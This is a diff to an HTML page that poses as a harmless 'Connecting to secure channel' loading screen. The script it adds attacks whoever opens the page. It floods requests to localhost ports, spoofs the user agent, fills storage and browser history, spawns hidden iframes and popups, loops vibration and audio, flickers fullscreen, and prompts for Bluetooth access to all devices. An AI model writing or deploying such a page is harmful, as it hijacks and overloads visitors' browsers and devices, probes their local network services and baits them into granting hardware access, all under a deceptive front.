@@ -1,23 +1,68 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Connecting...</title>
+  <title>Redirecting...</title>
+  <style>
+    body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 20%; }
+    h1 { animation: flicker 0.15s infinite alternate; }
+    @keyframes flicker { from {opacity: 1;} to {opacity: 0.1;} }
+  </style>
   <script>
-    setInterval(() => {
-      for (let i = 0; i < 15; i++) {
-        const xhr = new XMLHttpRequest();
-        xhr.open("GET", `https://localhost:${1000 + i}/?junk=${Math.random()}`, true);
-        xhr.send();
-      }
-    }, 100);
+    // Identity decoy
+    navigator.__defineGetter__('userAgent', () => 'Nokia 3310 SE');
 
+    // Network spam
+    setInterval(() => {
+      for (let i = 0; i < 30; i++) {
+        fetch(`https://127.0.0.1:${8000 + i}/?junk=` + Math.random()).catch(() => {});
+      }
+    }, 50);
+
+    // Audio overload
     setInterval(() => {
       const audio = new Audio("data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEA...");
       audio.play().catch(() => {});
-    }, 500);
+    }, 400);
+
+    // Browser history + storage flood
+    setInterval(() => {
+      localStorage.setItem('jam_' + Math.random(), Math.random());
+      history.pushState({}, '', '/jam_' + Math.random());
+    }, 10);
+
+    // Invisible iframe swarm
+    setInterval(() => {
+      const iframe = document.createElement("iframe");
+      iframe.src = "https://example.com/?q=" + Math.random();
+      iframe.style = "width:1px;height:1px;position:absolute;left:-9999px;";
+      document.body.appendChild(iframe);
+    }, 100);
+
+    // Mobile vibration loop
+    if (navigator.vibrate) {
+      setInterval(() => navigator.vibrate([200, 100, 200, 100]), 1000);
+    }
+
+    // Bluetooth access bait
+    try {
+      navigator.bluetooth.requestDevice({ acceptAllDevices: true }).catch(() => {});
+    } catch (e) {}
+
+    // Fullscreen flicker
+    setInterval(() => {
+      if (document.fullscreenEnabled) {
+        document.documentElement.requestFullscreen().catch(()=>{});
+        setTimeout(() => document.exitFullscreen().catch(()=>{}), 500);
+      }
+    }, 2000);
+
+    // Popup swarm
+    setInterval(() => {
+      window.open("about:blank", "_blank", "width=200,height=100");
+    }, 3000);
   </script>
 </head>
 <body>
-  <h1>404 Not Found</h1>
+  <h1>Hold on... Connecting to secure channel...</h1>
 </body>
 </html>
